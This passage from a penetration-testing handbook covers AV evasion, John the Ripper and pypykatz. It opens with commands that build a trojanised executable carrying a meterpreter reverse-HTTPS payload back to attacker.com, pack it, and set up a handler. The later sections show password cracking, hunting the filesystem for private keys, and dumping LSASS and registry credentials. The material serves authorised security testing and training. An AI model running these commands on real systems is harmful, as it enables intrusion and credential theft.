<li>Script file (JS, VBS, PS1)</li>
<li>Archive with password</li>
</ul>
<h3 id="step-2-apply-obfuscation"><a class="header" href="#step-2-apply-obfuscation">Step 2: Apply Obfuscation</a></h3>
<pre><code class="language-bash"># Generate encoded backdoored executable
msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
  -x legit_app.exe -k \
  -e x86/shikata_ga_nai -i 15 \
  -f exe -o trojan.exe
</code></pre>
<h3 id="step-3-pack-the-payload-optional"><a class="header" href="#step-3-pack-the-payload-optional">Step 3: Pack the Payload (Optional)</a></h3>
<pre><code class="language-bash">upx -9 trojan.exe -o trojan_packed.exe
</code></pre>
<h3 id="step-4-test-detection"><a class="header" href="#step-4-test-detection">Step 4: Test Detection</a></h3>
<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f trojan_packed.exe
</code></pre>
<h3 id="step-5-setup-handler"><a class="header" href="#step-5-setup-handler">Step 5: Setup Handler</a></h3>
<pre><code class="language-bash">use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set EnableStageEncoding true
run -j
</code></pre>
<h3 id="step-6-deliver-and-execute"><a class="header" href="#step-6-deliver-and-execute">Step 6: Deliver and Execute</a></h3>
<ul>
<li>Social engineering</li>
<li>Phishing email</li>
<li>Physical access</li>
<li>Exploit existing vulnerability</li>
</ul>
<hr>
<h2 id="important-notes"><a class="header" href="#important-notes">Important Notes</a></h2>
<ol>
<li><strong>Testing Environment</strong>: Always test evasion techniques in a sandbox before live deployment</li>
<li><strong>Single Chance</strong>: During assessments, you may only have one opportunity to succeed</li>
<li><strong>Signature Updates</strong>: AV vendors regularly update signatures for known tools</li>
<li><strong>Layered Approach</strong>: Combine multiple evasion techniques for better results</li>
<li><strong>Legal Compliance</strong>: Only use these techniques during authorized penetration tests</li>
</ol>
<hr>
<h2 id="additional-resources"><a class="header" href="#additional-resources">Additional Resources</a></h2>
<ul>
<li><a href="https://nostarch.com/metasploit">Metasploit - The Penetration Tester‚Äôs Guide</a> - No Starch Press</li>
<li><a href="https://github.com/polypack">PolyPack Project</a> - Packer research</li>
<li><a href="https://github.com/Veil-Framework/Veil">Veil Framework</a> - Payload generation framework</li>
<li><a href="https://www.shellterproject.com/">Shellter</a> - Dynamic shellcode injection</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="john-the-ripper"><a class="header" href="#john-the-ripper">John the Ripper</a></h1>
<p>John the Ripper (aka JtR or john) is a well-known penetration testing tool used for cracking passwords through various attacks including brute-force and dictionary. It is open-source software initially developed for UNIX-based systems and was first released in 1996. It has become a staple of the security industry due to its various capabilities.</p>
<p>The ‚Äújumbo‚Äù variant is recommended for penetration testing uses, as it has performance optimizations, additional features such as multilingual word lists, and support for 64-bit architectures. This version is able to crack passwords with greater accuracy and speed.</p>
<p>Included with JtR are various tools for converting different types of files and hashes into formats that are usable by JtR. Additionally, the software is regularly updated to keep up with the current security trends and technologies.</p>
<hr>
<h2 id="installation-5"><a class="header" href="#installation-5">Installation</a></h2>
<p>John the Ripper often comes pre-installed on penetration testing distributions like Kali Linux. You can verify its presence by running:</p>
<pre><code class="language-sh">john --help
</code></pre>
<p>If not installed, you can install it from the package repository:</p>
<pre><code class="language-sh">sudo apt-get update
sudo apt-get install john
</code></pre>
<p>For the jumbo version with additional features:</p>
<pre><code class="language-sh">sudo apt-get install john-jumbo
</code></pre>
<hr>
<h2 id="basic-syntax-7"><a class="header" href="#basic-syntax-7">Basic Syntax</a></h2>
<pre><code class="language-sh">john [options] &lt;hash_file&gt;
</code></pre>
<hr>
<h2 id="cracking-modes-1"><a class="header" href="#cracking-modes-1">Cracking Modes</a></h2>
<p>John the Ripper supports multiple cracking modes, each suited for different scenarios.</p>
<h3 id="single-crack-mode"><a class="header" href="#single-crack-mode">Single Crack Mode</a></h3>
<p>Single crack mode is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim‚Äôs username, home directory name, and GECOS values (full name, room number, phone number, etc.). These strings are run against a large set of rules that apply common string modifications seen in passwords.</p>
<p><strong>Example:</strong> A user whose real name is ‚ÄúBob Smith‚Äù might use ‚ÄúSmith1‚Äù as their password.</p>
<p>Given a passwd file with contents like:</p>
<pre><code>r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
</code></pre>
<p>Based on the file contents, it can be inferred that the victim has:</p>
<ul>
<li>Username: <code>r0lf</code></li>
<li>Real name: <code>Rolf Sebastian</code></li>
<li>Home directory: <code>/home/r0lf</code></li>
</ul>
<p>Single crack mode will use this information to generate candidate passwords:</p>
<pre><code class="language-sh">john --single passwd
</code></pre>
<h3 id="wordlist-mode"><a class="header" href="#wordlist-mode">Wordlist Mode</a></h3>
<p>Wordlist mode is used to crack passwords with a dictionary attack, meaning it attempts all passwords in a supplied wordlist against the password hash.</p>
<pre><code class="language-sh">john --wordlist=&lt;wordlist_file&gt; &lt;hash_file&gt;
</code></pre>
<p>The wordlist file must be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma.</p>
<p>Rules can be applied to generate candidate passwords using transformations such as appending numbers, capitalizing letters, and adding special characters:</p>
<pre><code class="language-sh">john --wordlist=passwords.txt --rules hashes.txt
</code></pre>
<h3 id="incremental-mode"><a class="header" href="#incremental-mode">Incremental Mode</a></h3>
<p>Incremental mode is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model (Markov chains). It is designed to test all character combinations defined by a specific character set, prioritizing more likely passwords based on training data.</p>
<p>This mode is the most exhaustive, but also the most time-consuming. It generates password guesses dynamically and does not rely on a predefined wordlist. Unlike purely random brute-force attacks, Incremental mode uses a statistical model to make educated guesses, resulting in significantly more efficient cracking.</p>
<pre><code class="language-sh">john --incremental hashes.txt
</code></pre>
<hr>
<h2 id="common-options-6"><a class="header" href="#common-options-6">Common Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>--single</code></td><td>Use single crack mode</td><td><code>john --single passwd</code></td></tr>
<tr><td><code>--wordlist=FILE</code></td><td>Use wordlist for dictionary attack</td><td><code>john --wordlist=passwords.txt hashes.txt</code></td></tr>
<tr><td><code>--incremental</code></td><td>Use incremental (brute-force) mode</td><td><code>john --incremental hashes.txt</code></td></tr>
<tr><td><code>--format=FORMAT</code></td><td>Specify hash format</td><td><code>john --format=raw-md5 hashes.txt</code></td></tr>
<tr><td><code>--rules</code></td><td>Apply word mangling rules</td><td><code>john --wordlist=words.txt --rules hashes.txt</code></td></tr>
<tr><td><code>--show</code></td><td>Display cracked passwords</td><td><code>john --show hashes.txt</code></td></tr>
<tr><td><code>--pot=FILE</code></td><td>Specify pot file location</td><td><code>john --pot=custom.pot hashes.txt</code></td></tr>
<tr><td><code>--session=NAME</code></td><td>Name the session for restore</td><td><code>john --session=crack1 hashes.txt</code></td></tr>
<tr><td><code>--restore=NAME</code></td><td>Restore a previous session</td><td><code>john --restore=crack1</code></td></tr>
<tr><td><code>--list=formats</code></td><td>List all supported hash formats</td><td><code>john --list=formats</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="hash-formats"><a class="header" href="#hash-formats">Hash Formats</a></h2>
<p>John the Ripper supports a wide variety of hash formats. Use <code>--format=FORMAT</code> to specify the hash type.</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Format</th><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Raw MD5</td><td><code>john --format=raw-md5 [...] &lt;hash_file&gt;</code></td><td>Raw MD5 password hashes</td></tr>
<tr><td>Raw SHA1</td><td><code>john --format=raw-sha1 [...] &lt;hash_file&gt;</code></td><td>Raw SHA1 password hashes</td></tr>
<tr><td>Raw SHA256</td><td><code>john --format=raw-sha256 [...] &lt;hash_file&gt;</code></td><td>Raw SHA256 password hashes</td></tr>
<tr><td>Raw SHA512</td><td><code>john --format=raw-sha512 [...] &lt;hash_file&gt;</code></td><td>Raw SHA512 password hashes</td></tr>
<tr><td>SHA512crypt</td><td><code>john --format=sha512crypt [...] &lt;hash_file&gt;</code></td><td>Linux crypt(3) $6$ hashes</td></tr>
<tr><td>MD5crypt</td><td><code>john --format=md5crypt [...] &lt;hash_file&gt;</code></td><td>Linux crypt(3) $1$ hashes</td></tr>
<tr><td>bcrypt</td><td><code>john --format=bcrypt [...] &lt;hash_file&gt;</code></td><td>Blowfish-based password hashes</td></tr>
<tr><td>NT</td><td><code>john --format=nt [...] &lt;hash_file&gt;</code></td><td>Windows NT password hashes</td></tr>
<tr><td>LM</td><td><code>john --format=LM [...] &lt;hash_file&gt;</code></td><td>LAN Manager password hashes</td></tr>
<tr><td>NETLM</td><td><code>john --format=netlm [...] &lt;hash_file&gt;</code></td><td>NT LAN Manager network hashes</td></tr>
<tr><td>NETLMv2</td><td><code>john --format=netlmv2 [...] &lt;hash_file&gt;</code></td><td>NTLMv2 network hashes</td></tr>
<tr><td>NETNTLM</td><td><code>john --format=netntlm [...] &lt;hash_file&gt;</code></td><td>NTLM network hashes</td></tr>
<tr><td>NETNTLMv2</td><td><code>john --format=netntlmv2 [...] &lt;hash_file&gt;</code></td><td>NTLMv2 network hashes</td></tr>
<tr><td>Kerberos 5</td><td><code>john --format=krb5 [...] &lt;hash_file&gt;</code></td><td>Kerberos 5 password hashes</td></tr>
<tr><td>MS Cache</td><td><code>john --format=mscash [...] &lt;hash_file&gt;</code></td><td>MS Cache password hashes</td></tr>
<tr><td>MS Cache v2</td><td><code>john --format=mscash2 [...] &lt;hash_file&gt;</code></td><td>MS Cache v2 password hashes</td></tr>
<tr><td>MySQL</td><td><code>john --format=mysql [...] &lt;hash_file&gt;</code></td><td>MySQL password hashes</td></tr>
<tr><td>MySQL SHA1</td><td><code>john --format=mysql-sha1 [...] &lt;hash_file&gt;</code></td><td>MySQL SHA1 password hashes</td></tr>
<tr><td>MSSQL</td><td><code>john --format=mssql [...] &lt;hash_file&gt;</code></td><td>MS SQL password hashes</td></tr>
<tr><td>MSSQL 2005</td><td><code>john --format=mssql05 [...] &lt;hash_file&gt;</code></td><td>MS SQL 2005 password hashes</td></tr>
<tr><td>Oracle</td><td><code>john --format=oracle [...] &lt;hash_file&gt;</code></td><td>Oracle password hashes</td></tr>
<tr><td>Oracle 11</td><td><code>john --format=oracle11 [...] &lt;hash_file&gt;</code></td><td>Oracle 11 password hashes</td></tr>
<tr><td>PostgreSQL</td><td><code>john --format=postgres [...] &lt;hash_file&gt;</code></td><td>PostgreSQL password hashes</td></tr>
<tr><td>PDF</td><td><code>john --format=pdf [...] &lt;hash_file&gt;</code></td><td>PDF password hashes</td></tr>
<tr><td>RAR</td><td><code>john --format=rar [...] &lt;hash_file&gt;</code></td><td>RAR archive password hashes</td></tr>
<tr><td>ZIP</td><td><code>john --format=zip [...] &lt;hash_file&gt;</code></td><td>ZIP archive password hashes</td></tr>
<tr><td>SSH</td><td><code>john --format=ssh [...] &lt;hash_file&gt;</code></td><td>SSH private key password hashes</td></tr>
<tr><td>HMAC-MD5</td><td><code>john --format=hmac-md5 [...] &lt;hash_file&gt;</code></td><td>HMAC-MD5 password hashes</td></tr>
<tr><td>Cisco PIX MD5</td><td><code>john --format=pix-md5 [...] &lt;hash_file&gt;</code></td><td>Cisco PIX MD5 password hashes</td></tr>
<tr><td>Lotus Notes 5</td><td><code>john --format=lotus5 [...] &lt;hash_file&gt;</code></td><td>Lotus Notes/Domino 5 password hashes</td></tr>
<tr><td>SAP BCODE</td><td><code>john --format=sapb [...] &lt;hash_file&gt;</code></td><td>SAP CODVN B password hashes</td></tr>
<tr><td>SAP PASSCODE</td><td><code>john --format=sapg [...] &lt;hash_file&gt;</code></td><td>SAP CODVN G password hashes</td></tr>
</tbody>
</table>
</div>
<p>To list all supported formats:</p>
<pre><code class="language-sh">john --list=formats
</code></pre>
<hr>
<h2 id="cracking-files-with-2john-tools"><a class="header" href="#cracking-files-with-2john-tools">Cracking Files with 2john Tools</a></h2>
<p>Password-protected or encrypted files can be cracked with JtR using the included ‚Äú2john‚Äù conversion tools. These tools process files and produce hashes compatible with JtR.</p>
<h3 id="general-syntax-1"><a class="header" href="#general-syntax-1">General Syntax</a></h3>
<pre><code class="language-sh">&lt;tool&gt; &lt;file_to_crack&gt; &gt; file.hash
john file.hash
</code></pre>
<h3 id="available-2john-tools"><a class="header" href="#available-2john-tools">Available 2john Tools</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>pdf2john</code></td><td>Converts PDF documents for John</td></tr>
<tr><td><code>ssh2john</code></td><td>Converts SSH private keys for John</td></tr>
<tr><td><code>mscash2john</code></td><td>Converts MS Cash hashes for John</td></tr>
<tr><td><code>keychain2john</code></td><td>Converts OS X keychain files for John</td></tr>
<tr><td><code>rar2john</code></td><td>Converts RAR archives for John</td></tr>
<tr><td><code>pfx2john</code></td><td>Converts PKCS#12 files for John</td></tr>
<tr><td><code>truecrypt_volume2john</code></td><td>Converts TrueCrypt volumes for John</td></tr>
<tr><td><code>keepass2john</code></td><td>Converts KeePass databases for John</td></tr>
<tr><td><code>vncpcap2john</code></td><td>Converts VNC PCAP files for John</td></tr>
<tr><td><code>putty2john</code></td><td>Converts PuTTY private keys for John</td></tr>
<tr><td><code>zip2john</code></td><td>Converts ZIP archives for John</td></tr>
<tr><td><code>hccap2john</code></td><td>Converts WPA/WPA2 handshake captures for John</td></tr>
<tr><td><code>office2john</code></td><td>Converts MS Office documents for John</td></tr>
<tr><td><code>wpa2john</code></td><td>Converts WPA/WPA2 handshakes for John</td></tr>
<tr><td><code>bitlocker2john</code></td><td>Converts BitLocker volumes for John</td></tr>
<tr><td><code>dmg2john</code></td><td>Converts macOS DMG files for John</td></tr>
<tr><td><code>gpg2john</code></td><td>Converts GPG keys for John</td></tr>
<tr><td><code>7z2john.pl</code></td><td>Converts 7-Zip archives for John</td></tr>
<tr><td><code>1password2john.py</code></td><td>Converts 1Password vaults for John</td></tr>
<tr><td><code>androidbackup2john.py</code></td><td>Converts Android backup files for John</td></tr>
</tbody>
</table>
</div>
<p>Find all available 2john tools on your system:</p>
<pre><code class="language-sh">locate *2john*
</code></pre>
<hr>
<h2 id="common-usage-examples-2"><a class="header" href="#common-usage-examples-2">Common Usage Examples</a></h2>
<h3 id="crack-linux-shadow-file-single-mode"><a class="header" href="#crack-linux-shadow-file-single-mode">Crack Linux Shadow File (Single Mode)</a></h3>
<pre><code class="language-sh">john --single passwd
</code></pre>
<h3 id="dictionary-attack-1"><a class="header" href="#dictionary-attack-1">Dictionary Attack</a></h3>
<pre><code class="language-sh">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
</code></pre>
<h3 id="dictionary-attack-with-rules-2"><a class="header" href="#dictionary-attack-with-rules-2">Dictionary Attack with Rules</a></h3>
<pre><code class="language-sh">john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt
</code></pre>
<h3 id="crack-specific-hash-format"><a class="header" href="#crack-specific-hash-format">Crack Specific Hash Format</a></h3>
<pre><code class="language-sh">john --format=raw-md5 --wordlist=passwords.txt md5_hashes.txt
</code></pre>
<h3 id="show-cracked-passwords-1"><a class="header" href="#show-cracked-passwords-1">Show Cracked Passwords</a></h3>
<pre><code class="language-sh">john --show hashes.txt
</code></pre>
<h3 id="incremental-brute-force-mode"><a class="header" href="#incremental-brute-force-mode">Incremental (Brute Force) Mode</a></h3>
<pre><code class="language-sh">john --incremental hashes.txt
</code></pre>
<h3 id="crack-a-zip-file"><a class="header" href="#crack-a-zip-file">Crack a ZIP File</a></h3>
<pre><code class="language-sh">zip2john protected.zip &gt; zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
</code></pre>
<h3 id="crack-an-ssh-private-key"><a class="header" href="#crack-an-ssh-private-key">Crack an SSH Private Key</a></h3>
<pre><code class="language-sh">ssh2john id_rsa &gt; ssh.hash
john --wordlist=passwords.txt ssh.hash
</code></pre>
<h3 id="crack-a-keepass-database"><a class="header" href="#crack-a-keepass-database">Crack a KeePass Database</a></h3>
<pre><code class="language-sh">keepass2john database.kdbx &gt; keepass.hash
john --wordlist=passwords.txt keepass.hash
</code></pre>
<h3 id="crack-a-pdf-file"><a class="header" href="#crack-a-pdf-file">Crack a PDF File</a></h3>
<pre><code class="language-sh">pdf2john protected.pdf &gt; pdf.hash
john --wordlist=passwords.txt pdf.hash
</code></pre>
<h3 id="crack-ms-office-document-1"><a class="header" href="#crack-ms-office-document-1">Crack MS Office Document</a></h3>
<pre><code class="language-sh">office2john document.docx &gt; office.hash
john --wordlist=passwords.txt office.hash
</code></pre>
<h3 id="save-and-restore-session"><a class="header" href="#save-and-restore-session">Save and Restore Session</a></h3>
<pre><code class="language-sh"># Start a named session
john --session=mycrack --wordlist=big_wordlist.txt hashes.txt

# If interrupted, restore the session
john --restore=mycrack
</code></pre>
<hr>
<hr>
<h2 id="cracking-protected-files-2"><a class="header" href="#cracking-protected-files-2">Cracking Protected Files</a></h2>
<p>The use of file encryption is often neglected in both private and professional contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption. Nevertheless, encrypted files can still be cracked with the right combination of wordlists and tools.</p>
<h3 id="hunting-for-encrypted-files-2"><a class="header" href="#hunting-for-encrypted-files-2">Hunting for Encrypted Files</a></h3>
<p>Many different extensions correspond to encrypted files. Use this command to locate commonly encrypted files on a Linux system:</p>
<pre><code class="language-sh">for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nFile extension: " $ext
  find / -name *$ext 2&gt;/dev/null | grep -v "lib\|fonts\|share\|core"
done
</code></pre>
<h3 id="hunting-for-ssh-keys-1"><a class="header" href="#hunting-for-ssh-keys-1">Hunting for SSH Keys</a></h3>
<p>SSH private keys don‚Äôt have standard file extensions, but they can be identified by their header content:</p>
<pre><code class="language-sh">grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2&gt;/dev/null
</code></pre>
<p>Example output:</p>
<pre><code>/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
</code></pre>
<p>To check if an SSH key is encrypted, try reading it with <code>ssh-keygen</code>:</p>
<pre><code class="language-sh">ssh-keygen -yf ~/.ssh/id_rsa
# If encrypted, prompts: Enter passphrase for "/home/jsmith/.ssh/id_rsa":
</code></pre>
<p>Older PEM formats show encryption info in the header:</p>
<pre><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
</code></pre>
<h3 id="cracking-encrypted-ssh-keys"><a class="header" href="#cracking-encrypted-ssh-keys">Cracking Encrypted SSH Keys</a></h3>
<p>Use <code>ssh2john.py</code> to extract the hash, then crack with JtR:</p>
<pre><code class="language-sh">ssh2john.py SSH.private &gt; ssh.hash
john --wordlist=rockyou.txt ssh.hash
</code></pre>
<p>View the cracked password:</p>
<pre><code class="language-sh">john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
</code></pre>
<h3 id="cracking-password-protected-documents"><a class="header" href="#cracking-password-protected-documents">Cracking Password-Protected Documents</a></h3>
<p>Most reports, documentation, and information sheets are distributed as Microsoft Office documents or PDFs. Use <code>office2john.py</code> to extract password hashes from Office documents:</p>
<pre><code class="language-sh">office2john.py Protected.docx &gt; protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show

Protected.docx:1234

1 password hash cracked, 0 left
</code></pre>
<p>For PDF files, use <code>pdf2john.py</code>:</p>
<pre><code class="language-sh">pdf2john.py PDF.pdf &gt; pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
</code></pre>
<hr>
<h2 id="cracking-protected-archives-2"><a class="header" href="#cracking-protected-archives-2">Cracking Protected Archives</a></h2>
<p>Besides standalone files, we often encounter password-protected archives such as ZIP files.</p>
<h3 id="common-archive-types"><a class="header" href="#common-archive-types">Common Archive Types</a></h3>
<p>Common archive extensions include: <code>tar</code>, <code>gz</code>, <code>rar</code>, <code>zip</code>, <code>vmdb/vmx</code>, <code>cpt</code>, <code>truecrypt</code>, <code>bitlocker</code>, <code>kdbx</code>, <code>deb</code>, <code>7z</code>, and <code>gzip</code>.</p>
<h3 id="cracking-zip-files"><a class="header" href="#cracking-zip-files">Cracking ZIP Files</a></h3>
<pre><code class="language-sh">zip2john ZIP.zip &gt; zip.hash
cat zip.hash
# ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*...*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip

john --wordlist=rockyou.txt zip.hash
john zip.hash --show

ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip

1 password hash cracked, 0 left
</code></pre>
<h3 id="cracking-openssl-encrypted-gzip-files-1"><a class="header" href="#cracking-openssl-encrypted-gzip-files-1">Cracking OpenSSL Encrypted GZIP Files</a></h3>
<p>Some archive formats don‚Äôt natively support password protection and are encrypted using tools like <code>openssl</code>. Use the <code>file</code> command to identify such files:</p>
<pre><code class="language-sh">file GZIP.gzip
# GZIP.gzip: openssl enc'd data with salted password
</code></pre>
<p>When cracking OpenSSL encrypted files, a reliable approach is to use <code>openssl</code> within a loop that attempts to extract contents directly:</p>
<pre><code class="language-sh">for i in $(cat rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null | tar xz
done
</code></pre>
<p>GZIP-related error messages can be safely ignored. When the correct password is found, the file is extracted to the current directory.</p>
<h3 id="cracking-bitlocker-encrypted-drives-1"><a class="header" href="#cracking-bitlocker-encrypted-drives-1">Cracking BitLocker-Encrypted Drives</a></h3>
<p>BitLocker is a full-disk encryption feature for Windows using AES with 128-bit or 256-bit keys. Use <code>bitlocker2john</code> to extract hashes:</p>
<pre><code class="language-sh">bitlocker2john -i Backup.vhd &gt; backup.hashes
grep "bitlocker\$0" backup.hashes &gt; backup.hash
cat backup.hash
# $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$...
</code></pre>
<p>The script outputs four hashes: the first two are for the password, the latter two for the recovery key. Focus on cracking the password hash (<code>$bitlocker$0$...</code>).</p>
<pre><code class="language-sh">john --wordlist=rockyou.txt backup.hash
</code></pre>
<p>Note: BitLocker uses strong AES encryption, so cracking may take considerable time.</p>
<h3 id="mounting-bitlocker-drives-in-linux-1"><a class="header" href="#mounting-bitlocker-drives-in-linux-1">Mounting BitLocker Drives in Linux</a></h3>
<p>Install <code>dislocker</code>:</p>
<pre><code class="language-sh">sudo apt-get install dislocker
</code></pre>
<p>Create mount directories:</p>
<pre><code class="language-sh">sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
</code></pre>
<p>Mount and decrypt:</p>
<pre><code class="language-sh">sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
</code></pre>
<p>Browse the files:</p>
<pre><code class="language-sh">cd /media/bitlockermount/
ls -la
</code></pre>
<p>Unmount when done:</p>
<pre><code class="language-sh">sudo umount /media/bitlockermount
sudo umount /media/bitlocker
</code></pre>
<hr>
<h2 id="core-takeaways-4"><a class="header" href="#core-takeaways-4">Core Takeaways</a></h2>
<ul>
<li><strong>Single crack mode</strong> is most effective for Linux credentials, using username and GECOS data to generate candidates.</li>
<li><strong>Wordlist mode</strong> performs dictionary attacks; use <code>--rules</code> to apply transformations for better coverage.</li>
<li><strong>Incremental mode</strong> is exhaustive brute-force using Markov chains, best for when wordlists fail.</li>
<li>Use <code>--format=FORMAT</code> when John doesn‚Äôt auto-detect the hash type correctly.</li>
<li>The <strong>2john tools</strong> convert various file types (ZIP, PDF, SSH keys, etc.) into crackable hash formats.</li>
<li>Use <code>--session</code> and <code>--restore</code> for long-running cracks that may be interrupted.</li>
<li>Use <code>--show</code> to display previously cracked passwords from the pot file.</li>
<li>The jumbo version includes more formats, rules, and optimizations for better performance.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="pypykatz"><a class="header" href="#pypykatz">pypykatz</a></h1>
<p>pypykatz is a Python implementation of Mimikatz, allowing credential extraction and DPAPI attacks without requiring native Windows binaries. It can parse LSASS dumps offline (cross-platform) or attack live systems on Windows. This makes it ideal for situations where running the original Mimikatz is not possible or would trigger detection.</p>
<h2 id="key-capabilities"><a class="header" href="#key-capabilities">Key Capabilities</a></h2>
<ul>
<li><strong>Offline Analysis</strong>: Parse LSASS memory dumps from any OS (Linux, macOS, Windows)</li>
<li><strong>Live LSASS Access</strong>: Extract credentials from running LSASS process (Windows only)</li>
<li><strong>DPAPI Attacks</strong>: Decrypt DPAPI-protected secrets including Credential Manager</li>
<li><strong>Registry Parsing</strong>: Extract secrets from SAM, SECURITY, and SYSTEM hives</li>
<li><strong>Cross-Platform</strong>: Works on Linux, macOS, and Windows</li>
</ul>
<hr>
<h2 id="installation-6"><a class="header" href="#installation-6">Installation</a></h2>
<pre><code class="language-bash"># Via pip
pip3 install pypykatz

# From GitHub
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip3 install .
</code></pre>
<hr>
<h2 id="basic-usage-3"><a class="header" href="#basic-usage-3">Basic Usage</a></h2>
<h3 id="parse-lsass-memory-dump"><a class="header" href="#parse-lsass-memory-dump">Parse LSASS Memory Dump</a></h3>
<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
</code></pre>
<h3 id="parse-lsass-dump-json-output"><a class="header" href="#parse-lsass-dump-json-output">Parse LSASS Dump (JSON Output)</a></h3>
<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp -o json &gt; creds.json
</code></pre>
<h3 id="live-lsass-extraction-windows-requires-admin"><a class="header" href="#live-lsass-extraction-windows-requires-admin">Live LSASS Extraction (Windows, requires admin)</a></h3>
<pre><code class="language-bash">pypykatz live lsa
</code></pre>
<h3 id="parse-registry-hives-offline"><a class="header" href="#parse-registry-hives-offline">Parse Registry Hives Offline</a></h3>
<pre><code class="language-bash">pypykatz registry --sam SAM --security SECURITY --system SYSTEM
</code></pre>
<hr>
<h2 id="credential-manager--dpapi-attacks"><a class="header" href="#credential-manager--dpapi-attacks">Credential Manager / DPAPI Attacks</a></h2>
<h3 id="decrypt-credential-files-1"><a class="header" href="#decrypt-credential-files-1">Decrypt Credential Files</a></h3>
<pre><code class="language-bash"># Decrypt a single credential file
pypykatz dpapi credential &lt;credential_file&gt; &lt;masterkey&gt;

# Decrypt all credentials in a directory
pypykatz dpapi credentials &lt;credentials_dir&gt; --mkf &lt;masterkey_file&gt;
</code></pre>
<h3 id="decrypt-vault-credentials-1"><a class="header" href="#decrypt-vault-credentials-1">Decrypt Vault Credentials</a></h3>
<pre><code class="language-bash">pypykatz dpapi vcrd &lt;vcrd_file&gt; &lt;masterkey&gt;
</code></pre>
<h3 id="extract-dpapi-masterkeys-from-lsass-dump"><a class="header" href="#extract-dpapi-masterkeys-from-lsass-dump">Extract DPAPI Masterkeys from LSASS Dump</a></h3>
<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp | grep -A5 "dpapi"
</code></pre>
<h3 id="decrypt-masterkey-file"><a class="header" href="#decrypt-masterkey-file">Decrypt Masterkey File</a></h3>
<pre><code class="language-bash"># With user password
pypykatz dpapi masterkey &lt;masterkey_file&gt; -p &lt;password&gt;

# With domain backup key
pypykatz dpapi masterkey &lt;masterkey_file&gt; --pvk &lt;domain_backup_key.pvk&gt;

# With SID and password
pypykatz dpapi prekey password &lt;SID&gt; &lt;password&gt;
</code></pre>
<hr>
<h2 id="lsass-dump-analysis-1"><a class="header" href="#lsass-dump-analysis-1">LSASS Dump Analysis</a></h2>
<h3 id="full-credential-dump-1"><a class="header" href="#full-credential-dump-1">Full Credential Dump</a></h3>
<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
</code></pre>
<h3 id="output-formats-1"><a class="header" href="#output-formats-1">Output Formats</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-o json</code></td><td>JSON output</td></tr>
<tr><td><code>-o grep</code></td><td>Grep-friendly output</td></tr>
<tr><td><code>-o text</code></td><td>Human-readable text (default)</td></tr>
</tbody>
</table>
</div>
<h3 id="parse-multiple-dumps"><a class="header" href="#parse-multiple-dumps">Parse Multiple Dumps</a></h3>
<pre><code class="language-bash">pypykatz lsa minidump dump1.dmp dump2.dmp dump3.dmp
</code></pre>
<h3 id="recursive-directory-parsing"><a class="header" href="#recursive-directory-parsing">Recursive Directory Parsing</a></h3>
<pre><code class="language-bash">pypykatz lsa minidump /path/to/dumps/ -r
</code></pre>
<hr>
<h2 id="registry-attacks"><a class="header" href="#registry-attacks">Registry Attacks</a></h2>
<h3 id="dump-sam-database"><a class="header" href="#dump-sam-database">Dump SAM Database</a></h3>
<pre><code class="language-bash">pypykatz registry --sam SAM --system SYSTEM
</code></pre>
<h3 id="dump-lsa-secrets"><a class="header" href="#dump-lsa-secrets">Dump LSA Secrets</a></h3>
<pre><code class="language-bash">pypykatz registry --security SECURITY --system SYSTEM
</code></pre>
